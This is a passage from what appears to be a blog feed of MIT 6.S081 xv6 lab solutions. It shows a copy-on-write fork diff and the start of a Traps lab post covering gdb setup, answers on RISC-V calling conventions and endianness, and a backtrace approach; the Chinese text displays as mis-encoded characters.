uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyin(pagetable_t, char *, uint64, uint64);</span><span class="token prefix unchanged"> </span><span class="token line">int             copyinstr(pagetable_t, char *, uint64, uint64);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">pte_t*          walk(pagetable_t, uint64, int);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// plic.c</span><span class="token prefix unchanged"> </span><span class="token line">void            plicinit(void);</span></span>diff --git a/kernel/kalloc.c b/kernel/kalloc.cindex fa6a0ac..5872b85 100644<span class="token coord">--- a/kernel/kalloc.c</span><span class="token coord">+++ b/kernel/kalloc.c</span>@@ -14,6 +14,11 @@ void freerange(void *pa_start, void *pa_end);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern char end[]; // first address after kernel.</span><span class="token prefix unchanged"> </span><span class="token line">                   // defined by kernel.ld.</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define PA2RFIDX(pa) ((((uint64)pa) - KERNBASE) / PGSIZE)</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">int rfcount[(PHYSTOP - KERNBASE) / PGSIZE];</span><span class="token prefix inserted">+</span><span class="token line">struct spinlock rflock;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">struct run &#123;</span><span class="token prefix unchanged"> </span><span class="token line">  struct run *next;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>@@ -27,6 +32,7 @@ void<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">kinit()</span><span class="token prefix unchanged"> </span><span class="token line">&#123;</span><span class="token prefix unchanged"> </span><span class="token line">  initlock(&amp;kmem.lock, "kmem");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  initlock(&amp;rflock, "rflock");</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  freerange(end, (void*)PHYSTOP);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -51,15 +57,17 @@ kfree(void *pa)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(((uint64)pa % PGSIZE) != 0 || (char*)pa &lt; end || (uint64)pa >= PHYSTOP)</span><span class="token prefix unchanged"> </span><span class="token line">    panic("kfree");</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  // Fill with junk to catch dangling refs.</span><span class="token prefix deleted">-</span><span class="token line">  memset(pa, 1, PGSIZE);</span><span class="token prefix deleted">-</span><span class="token line"></span><span class="token prefix deleted">-</span><span class="token line">  r = (struct run*)pa;</span><span class="token prefix deleted">-</span><span class="token line"></span><span class="token prefix deleted">-</span><span class="token line">  acquire(&amp;kmem.lock);</span><span class="token prefix deleted">-</span><span class="token line">  r->next = kmem.freelist;</span><span class="token prefix deleted">-</span><span class="token line">  kmem.freelist = r;</span><span class="token prefix deleted">-</span><span class="token line">  release(&amp;kmem.lock);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  acquire(&amp;rflock);</span><span class="token prefix inserted">+</span><span class="token line">  if(--rfcount[PA2RFIDX(pa)] &lt;= 0)&#123;</span><span class="token prefix inserted">+</span><span class="token line">    memset(pa, 1, PGSIZE);</span><span class="token prefix inserted">+</span><span class="token line">    // Fill with junk to catch dangling refs.</span><span class="token prefix inserted">+</span><span class="token line">    r = (struct run*)pa;</span><span class="token prefix inserted">+</span><span class="token line">    acquire(&amp;kmem.lock);</span><span class="token prefix inserted">+</span><span class="token line">    r->next = kmem.freelist;</span><span class="token prefix inserted">+</span><span class="token line">    kmem.freelist = r;</span><span class="token prefix inserted">+</span><span class="token line">    release(&amp;kmem.lock);</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  release(&amp;rflock);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// Allocate one 4096-byte page of physical memory.</span></span>@@ -76,7 +84,15 @@ kalloc(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    kmem.freelist = r->next;</span><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;kmem.lock);</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  if(r)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if(r) &#123;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    memset((char*)r, 5, PGSIZE); // fill with junk</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    rfcount[PA2RFIDX(r)] = 1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  return (void*)r;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">void incrfcount(void* pa)&#123;</span><span class="token prefix inserted">+</span><span class="token line">  acquire(&amp;rflock);</span><span class="token prefix inserted">+</span><span class="token line">  ++rfcount[PA2RFIDX(pa)];</span><span class="token prefix inserted">+</span><span class="token line">  release(&amp;rflock);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/kernel/riscv.h b/kernel/riscv.hindex 1691faf..a6ba9e7 100644<span class="token coord">--- a/kernel/riscv.h</span><span class="token coord">+++ b/kernel/riscv.h</span>@@ -343,6 +343,8 @@ sfence_vma()<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define PTE_W (1L &lt;&lt; 2)</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_X (1L &lt;&lt; 3)</span><span class="token prefix unchanged"> </span><span class="token line">#define PTE_U (1L &lt;&lt; 4) // 1 -> user can access</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define PTE_COW (1L &lt;&lt; 8) // 1 -> is a COW page</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// shift a physical address to the right place for a PTE.</span><span class="token prefix unchanged"> </span><span class="token line">#define PA2PTE(pa) ((((uint64)pa) >> 12) &lt;&lt; 10)</span></span>diff --git a/kernel/trap.c b/kernel/trap.cindex a63249e..0fb7687 100644<span class="token coord">--- a/kernel/trap.c</span><span class="token coord">+++ b/kernel/trap.c</span>@@ -29,6 +29,42 @@ trapinithart(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  w_stvec((uint64)kernelvec);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">int iscowpage(pagetable_t pgtbl, uint64 va) &#123;</span><span class="token prefix inserted">+</span><span class="token line">  if (va >= MAXVA) return 0;</span><span class="token prefix inserted">+</span><span class="token line">  pte_t *pte = walk(pgtbl, va, 0);</span><span class="token prefix inserted">+</span><span class="token line">  if (pte == 0) return 0;</span><span class="token prefix inserted">+</span><span class="token line">  if ((*pte &amp; PTE_V) == 0) return 0;</span><span class="token prefix inserted">+</span><span class="token line">  if ((*pte &amp; PTE_U) == 0) return 0;</span><span class="token prefix inserted">+</span><span class="token line">  return *pte &amp; PTE_COW;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">int cowfault(pagetable_t pagetable, uint64 va) &#123;</span><span class="token prefix inserted">+</span><span class="token line">  uint64 va0 = PGROUNDDOWN(va);</span><span class="token prefix inserted">+</span><span class="token line">  pte_t* pte;</span><span class="token prefix inserted">+</span><span class="token line">  if((pte = walk(pagetable, va0, 0)) == 0) return -1;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  uint64 flags = PTE_FLAGS(*pte);</span><span class="token prefix inserted">+</span><span class="token line">  uint64 pa0 = PTE2PA(*pte);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  flags &amp;= (~PTE_COW); // clear COW bit</span><span class="token prefix inserted">+</span><span class="token line">  flags |= PTE_W;      // set write bit</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  uint64 mem;</span><span class="token prefix inserted">+</span><span class="token line">  if ((mem = (uint64)kalloc()) == 0) return -1;</span><span class="token prefix inserted">+</span><span class="token line">  memmove((void *)mem, (void *)pa0, PGSIZE);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  // remove old PTE</span><span class="token prefix inserted">+</span><span class="token line">  uvmunmap(pagetable, va0, 1, 1);</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // install new PTE</span><span class="token prefix inserted">+</span><span class="token line">  if(mappages(pagetable, va0, PGSIZE, mem, flags) &lt; 0)&#123;</span><span class="token prefix inserted">+</span><span class="token line">    kfree((void *)mem);</span><span class="token prefix inserted">+</span><span class="token line">    return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//</span><span class="token prefix unchanged"> </span><span class="token line">// handle an interrupt, exception, or system call from user space.</span><span class="token prefix unchanged"> </span><span class="token line">// called from trampoline.S</span></span>@@ -67,7 +103,12 @@ usertrap(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    syscall();</span><span class="token prefix unchanged"> </span><span class="token line">  &#125; else if((which_dev = devintr()) != 0)&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    // ok</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  &#125; else &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  &#125; else if (r_scause() == 15 &amp;&amp; iscowpage(p->pagetable, r_stval())) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    if (cowfault(p->pagetable, r_stval()) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      p->killed = 1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  else &#123;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    printf("usertrap(): unexpected scause %p pid=%d\n", r_scause(), p->pid);</span><span class="token prefix unchanged"> </span><span class="token line">    printf("            sepc=%p stval=%p\n", r_sepc(), r_stval());</span><span class="token prefix unchanged"> </span><span class="token line">    p->killed = 1;</span></span>diff --git a/kernel/vm.c b/kernel/vm.cindex d5a12a0..df0ddde 100644<span class="token coord">--- a/kernel/vm.c</span><span class="token coord">+++ b/kernel/vm.c</span>@@ -303,22 +303,20 @@ uvmcopy(pagetable_t old, pagetable_t new, uint64 sz)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  pte_t *pte;</span><span class="token prefix unchanged"> </span><span class="token line">  uint64 pa, i;</span><span class="token prefix unchanged"> </span><span class="token line">  uint flags;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  char *mem;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  for(i = 0; i &lt; sz; i += PGSIZE)&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    if((pte = walk(old, i, 0)) == 0)</span><span class="token prefix unchanged"> </span><span class="token line">      panic("uvmcopy: pte should exist");</span><span class="token prefix unchanged"> </span><span class="token line">    if((*pte &amp; PTE_V) == 0)</span><span class="token prefix unchanged"> </span><span class="token line">      panic("uvmcopy: page not present");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    *pte &amp;= ~PTE_W;   // set write bit</span><span class="token prefix inserted">+</span><span class="token line">    *pte |= PTE_COW;  // clear COW bit</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pa = PTE2PA(*pte);</span><span class="token prefix unchanged"> </span><span class="token line">    flags = PTE_FLAGS(*pte);</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    if((mem = kalloc()) == 0)</span><span class="token prefix deleted">-</span><span class="token line">      goto err;</span><span class="token prefix deleted">-</span><span class="token line">    memmove(mem, (char*)pa, PGSIZE);</span><span class="token prefix deleted">-</span><span class="token line">    if(mappages(new, i, PGSIZE, (uint64)mem, flags) != 0)&#123;</span><span class="token prefix deleted">-</span><span class="token line">      kfree(mem);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if(mappages(new, i, PGSIZE, pa, flags) != 0)&#123;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">      goto err;</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    incrfcount((void*)pa); // increment reference count to pa</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  return 0;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -350,6 +348,9 @@ copyout(pagetable_t pagetable, uint64 dstva, char *src, uint64 len)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  while(len > 0)&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    va0 = PGROUNDDOWN(dstva);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    if (iscowpage(pagetable, va0)) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      cowfault(pagetable, va0);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pa0 = walkaddr(pagetable, va0);</span><span class="token prefix unchanged"> </span><span class="token line">    if(pa0 == 0)</span><span class="token prefix unchanged"> </span><span class="token line">      return -1;</span></span>diff --git a/time.txt b/time.txtnew file mode 100644index 0000000..209e3ef<span class="token coord">--- /dev/null</span><span class="token coord">+++ b/time.txt</span><span class="token coord">@@ -0,0 +1 @@</span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">20</span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Implement-copy-on-write&quot;&gt;&lt;a href=&quot;#Implement-copy-on-write&quot; class=&quot;headerlink&quot; title=&quot;Implement copy-on write&quot;&gt;&lt;/a&gt;Implement copy-on</summary>
      
    
    
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="ç»éªŒ" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Traps</title>
    <link href="http://lordaeronesz.github.io/2024/07/06/MIT6.s081-2021-Lab%20Traps/"/>
    <id>http://lordaeronesz.github.io/2024/07/06/MIT6.s081-2021-Lab%20Traps/</id>
    <published>2024-07-06T03:45:11.000Z</published>
    <updated>2024-07-07T08:04:10.879Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä½¿ç”¨gdbè°ƒè¯•xv6å†…æ ¸"><a href="#ä½¿ç”¨gdbè°ƒè¯•xv6å†…æ ¸" class="headerlink" title="ä½¿ç”¨gdbè°ƒè¯•xv6å†…æ ¸"></a>ä½¿ç”¨gdbè°ƒè¯•xv6å†…æ ¸</h1><p>ä»æœ€è¿‘ä¸¤ä¸ª Lab å¼€å§‹ï¼Œä»£ç é€»è¾‘çš„å¤æ‚åº¦æ˜æ˜¾ä¸Šå‡ï¼Œå¯¹å†…æ ¸è¿›è¡Œè°ƒè¯•å¯èƒ½æ˜¯å¸®åŠ©ç†è§£æ“ä½œç³»ç»Ÿæœºåˆ¶çš„ç»ä½³æ–¹æ³•ã€‚å› æ­¤åœ¨å¼€å§‹æœ¬ Lab ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥é…ç½®ä¸€ä¸‹é’ˆå¯¹ xv6 å†…æ ¸çš„ gdb è°ƒè¯•å™¨ã€‚</p><ol><li>å®‰è£… <code>gdb-multiarch</code>.</li></ol><p>åˆ©ç”¨åŒ…ç®¡ç†å·¥å…·è¿›è¡Œå®‰è£…ï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯ Ubuntu ç³»ç»Ÿï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell">sudo apt install gdb-multiarch</code></pre><ol start="2"><li>åœ¨ xv6 é¡¹ç›®æ ¹ç›®å½•ä¸‹å¯ä»¥çœ‹åˆ° <code>.gdbinit</code> æ–‡ä»¶ï¼Œå…¶ä¸­å·²ç»å†™å¥½äº†ä¸€äº› <code>gdb</code> çš„åˆå§‹åŒ–é€‰é¡¹ï¼Œä½¿ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æˆ– <code>cat</code> å‘½ä»¤æŸ¥çœ‹ï¼š</li></ol><pre class="language-ini" data-language="ini"><code class="language-ini">set confirm off                                                         set architecture riscv:rv64                                             target remote 127.0.0.1:26000                                           symbol-file kernel/kernel                                               set disassemble-next-line auto           set riscv use-compressed-breakpoints yes</code></pre><ol start="3"><li>åœ¨ <code>~/.config/gdb/</code> ç›®å½•ä¸‹çš„æ–‡ä»¶ <code>gdbinit</code> ä¸­ï¼ˆæ²¡æœ‰åˆ™æ–°å»ºï¼‰æ·»åŠ å®‰å…¨åŠ è½½è·¯å¾„ï¼Œå¦åˆ™å¯èƒ½æ— æ³•åŠ è½½ <code>.gdbinit</code> çš„é…ç½®ã€‚</li></ol><pre class="language-ini" data-language="ini"><code class="language-ini">add-auto-load-safe-path &lt;xv6é¡¹ç›®çš„æ ¹ç›®å½•>/.gdbinit</code></pre><ol start="4"><li>æ‰“å¼€ä¸¤ä¸ªç»ˆç«¯çª—å£ï¼ˆå¯ä»¥ä½¿ç”¨ tmux è¿›è¡Œåˆ†å±ï¼‰ï¼Œéƒ½éœ€è¦è¿›å…¥ xv6 æ ¹ç›®å½•ï¼Œç¬¬ä¸€ä¸ªçª—å£è¾“å…¥ <code>make-qemu</code> ç­‰å¾…è°ƒè¯•å™¨è¿æ¥ï¼Œç¬¬äºŒä¸ªçª—å£è¾“å…¥ <code>gdb-multiarch</code> æ‰“å¼€ <code>gdb</code>ï¼Œå¦‚æœå‰é¢é…ç½®æ­£ç¡®ï¼Œé‚£ä¹ˆ <code>gdb</code> å¹¶è‡ªåŠ¨åŠ è½½ <code>.gdbinit</code> é…ç½®ï¼Œä¸ <code>qemu</code> è¿æ¥ï¼Œä¹‹åä¾¿å¯ä»¥å¼€å§‹æ­£å¸¸è°ƒè¯•äº†ã€‚</li></ol><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/gdb.png"></p><h1 id="RISC-V-assembly"><a href="#RISC-V-assembly" class="headerlink" title="RISC-V assembly"></a>RISC-V assembly</h1><p>ä¸€äº›æœ‰å…³ RISC-V æ±‡ç¼–çš„é—®é¢˜ï¼Œæœ€å¥½å…ˆé€šè¿‡ç½‘ä¸Šåšå®¢æˆ–æ‰‹å†Œç®€å•äº†è§£ä¸€ä¸‹ RISC-V çš„åŸºæœ¬æŒ‡ä»¤ã€‚</p><p><strong>Q1:</strong> </p><blockquote><p>Which registers contain arguments to functions? For example, which register holds 13 in mainâ€™s call to <code>printf</code>?</p></blockquote><p><strong>A1:</strong> </p><p>å¯ä»¥å‚è€ƒ RISC-V çš„ <em>calling convention</em>ï¼Œ<code>a0</code> - <code>a7</code>: è¿™äº›å¯„å­˜å™¨ç”¨äºä¼ é€’å‡½æ•°çš„å‰å…«ä¸ªæ•´æ•°æˆ–æŒ‡é’ˆç±»å‹çš„å‚æ•°ï¼Œå¦‚æœè¶…å‡ºè¿™äº›å¯„å­˜å™¨çš„æ•°é‡ï¼Œè¶…å‡ºçš„éƒ¨åˆ†ä¼šå­˜æ”¾åœ¨æ ˆä¸Šã€‚è§‚å¯ŸæŒ‡ä»¤ <code>li  a2,13</code> å¯çŸ¥ï¼Œ13 ä½œä¸º <code>printf</code> çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œå­˜æ”¾åœ¨å¯„å­˜å™¨ <code>a2</code> ä¸­ã€‚</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/reg.png"></p><p><strong>Q2:</strong></p><blockquote><p>Where is the call to function <code>f</code> in the assembly code for main? Where is the call to <code>g</code>? (Hint: the compiler may inline functions.)</p></blockquote><p><strong>A2:</strong> </p><p>è°ƒç”¨å‡½æ•° <code>f</code> å’Œå‡½æ•° <code>g</code> çš„ä»£ç è¢«ç¼–è¯‘å™¨ä¼˜åŒ–ï¼Œç›´æ¥è®¡ç®—å‡ºäº†ç»“æœ 12ï¼Œä½œä¸º <code>printf</code> çš„å‚æ•°å­˜å…¥å¯„å­˜å™¨ <code>a1</code> ä¸­ï¼š</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">26:   45b1                    li  a1,12</code></pre><p><strong>Q3:</strong></p><blockquote><p>At what address is the function <code>printf</code> located?</p></blockquote><p><strong>A3:</strong> </p><p>ä½äº 0x638 åœ°å€å¤„ã€‚</p><p><strong>Q4:</strong></p><blockquote><p>What value is in the register <code>ra</code> just after the <code>jalr</code> to <code>printf</code> in <code>main</code>?</p></blockquote><p><strong>A4:</strong> å‚è€ƒ <a href="https://pdos.csail.mit.edu/6.828/2021/readings/riscv-calling.pdf">riscv-calling</a>ï¼Œ<code>ra</code> ç”¨æ¥å­˜å‚¨å‡½æ•°è°ƒç”¨çš„è¿”å›åœ°å€ï¼Œå› æ­¤ <code>ra</code> çš„å€¼ä¸º <code>jalr    1544(ra)</code> çš„åä¸€æ¡æŒ‡ä»¤åœ°å€ï¼Œå³ 0x38.</p><p><strong>Q5:</strong></p><blockquote><p>Run the following code.</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0x00646c72</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"H%x Wo%s"</span><span class="token punctuation">,</span> <span class="token number">57616</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>What is the output? <a href="http://web.cs.mun.ca/~michael/c/ascii-table.html">Hereâ€™s an ASCII table</a> that maps bytes to characters.</p><p>The output depends on that fact that the RISC-V is little-endian. If the RISC-V were instead big-endian what would you set <code>i</code> to in order to yield the same output? Would you need to change <code>57616</code> to a different value?</p><p><a href="http://www.webopedia.com/TERM/b/big_endian.html">Hereâ€™s a description of little- and big-endian</a> and <a href="http://www.networksorcery.com/enp/ien/ien137.txt">a more whimsical description</a>.</p></blockquote><p><strong>A5:</strong></p><ul><li><code>%x</code> ç”¨äºè¾“å‡ºä¸€ä¸ªæ— ç¬¦å·åå…­è¿›åˆ¶æ•´æ•°ã€‚</li><li><code>%s</code> ç”¨äºè¾“å‡ºä¸€ä¸ªå­—ç¬¦æŒ‡é’ˆæ‰€æŒ‡å‘çš„å­—ç¬¦ä¸²ï¼Œç›´åˆ°é‡åˆ°ç©ºå­—ç¬¦<code>\0</code>ä¸ºæ­¢ã€‚</li></ul><p>å°ç«¯æ¨¡å¼ä¸‹ï¼Œ57616 çš„ åå…­è¿›åˆ¶è¡¨ç¤ºä¸º e110ï¼Œ<code>&amp;i</code> é¦–åœ°å€å¼€å§‹çš„å­—èŠ‚åˆ†åˆ«ä¸º <code>0x72, 0x6c, 0x64, 0x0</code>ï¼Œå¯¹åº” ASCII è¡¨ä¸­çš„å­—ç¬¦ä¸º <code>r, l, d</code>ï¼Œå› æ­¤æœ€ç»ˆè¾“å‡ºç»“æœä¸º <code>He110 World</code>.</p><p>è‹¥é‡‡å–å¤§ç«¯æ¨¡å¼ï¼Œ<code>i</code> çš„å€¼åº”å½“æ›¿æ¢ä¸º <code>0x726c6400</code>ï¼Œ57616 çš„å€¼æ— éœ€æ”¹å˜ï¼Œå› ä¸ºåå…­è¿›åˆ¶çš„ä¹¦å†™è§„åˆ™å¹¶æ²¡æœ‰æ”¹å˜ï¼ˆé«˜ä½åœ¨å·¦ï¼Œä½ä½åœ¨å³ï¼‰ã€‚</p><p><strong>Q6:</strong></p><blockquote><p>In the following code, what is going to be printed after <code>&#39;y=&#39;</code>? (note: the answer is not a specific value.) Why does this happen?</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"x=%d y=%d"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><p><strong>A6:</strong></p><p>å…³äºå¯å˜å‚æ•°çš„å†…å®¹æŸ¥çœ‹ ã€Š<em>C Programming Language 2nd Edition</em>ã€‹ï¼ˆK&amp;Rï¼‰çš„ 7.3 èŠ‚ <em>Variable-length Argument Lists</em>.</p><p>ç®€è€Œè¨€ä¹‹ï¼Œè¿™æ ·çš„æ“ä½œå°†å¼•å‘<strong>æœªå®šä¹‰è¡Œä¸º</strong>ï¼Œæ­¤æ—¶ <code>ap</code> æŒ‡å‘äº†ä¸€ä¸ªæœªçŸ¥çš„å†…å­˜åŒºåŸŸï¼Œå¹¶å°†è¯¥åŒºåŸŸçš„æ•°æ®ä»¥æ•´å‹çš„å½¢å¼è¾“å‡ºã€‚</p><h1 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>æ€è·¯å…¶å®å¾ˆç®€å•ï¼šå¯¹ç…§ <a href="https://pdos.csail.mit.edu/6.828/2021/lec/l-riscv-slides.pdf">lecture notes</a> ç»™å‡ºçš„æ ˆçš„ç»“æ„ï¼Œä»å½“å‰æ ˆå¸§çš„èµ·å§‹åœ°å€ <code>fp</code> å¼€å§‹ï¼Œ<code>fp - 8</code> çš„ä½ç½®å­˜æ”¾ç€å½“å‰å‡½æ•°è°ƒç”¨çš„è¿”å›åœ°å€ï¼ˆä¸Šä¸€æ¬¡å‡½æ•°è°ƒç”¨å¤„çš„ä¸‹ä¸€æ¡æŒ‡ä»¤åœ°å€ï¼‰ï¼Œå³æˆ‘ä»¬ <strong>éœ€è¦æ‰“å°</strong> çš„åœ°å€ï¼Œ<code>fp - 16</code> çš„ä½ç½®å­˜æ”¾ç€ä¸Šä¸€æ¬¡å‡½æ•°è°ƒç”¨æ‰€åœ¨æ ˆå¸§çš„èµ·å§‹åœ°å€ï¼Œå°†è¯¥åœ°å€ä½œä¸ºæ–°çš„ <code>fp</code> é‡å¤ä¸Šè¿°æ­¥éª¤å³å¯ã€‚</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/st.png"></p><p>å…³é”®é—®é¢˜æ˜¯ <strong>ä»€ä¹ˆæ—¶å€™åœæ­¢</strong> ï¼Ÿå¯ä»¥çœ‹åˆ°ä¸Šè¿° backtrace çš„è¿‡ç¨‹å°±å¥½åƒæ˜¯åœ¨éå†ä¸€ä¸ªé“¾è¡¨ï¼Œå½“é“¾è¡¨çš„ <code>next</code> åŸŸä¸ºç©ºæŒ‡é’ˆæ—¶é“¾è¡¨åˆ°è¾¾æœ«å°¾ï¼Œé‚£ traceback å®Œæˆå<code>fp</code> çš„å€¼åº”è¯¥æ˜¯ä»€ä¹ˆï¼Ÿä¸ºäº†å¯»æ‰¾è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆï¼Œæˆ‘é€‰æ‹©å…ˆä¸è®¾ç½®ç»ˆæ­¢æ¡ä»¶ï¼Œè®©å®ƒä¸€ç›´å‘ä¸Šæœç´¢ï¼Œæœ€åå‘ç°ï¼Œè¿”å›åœ°å€æœ€ç»ˆä¸ºä¸€ä¸ªå¾ˆå°çš„å€¼ï¼Œè¿™ä¸ªåœ°å€æ˜¾ç„¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„ï¼Œåœ¨æ­¤ä¹‹å‰åº”è¯¥é€€å‡ºï¼Œå³æœ¬æ¬¡ traceback çš„å°½å¤´æ˜¯ 0x80001c92.</p><p><img 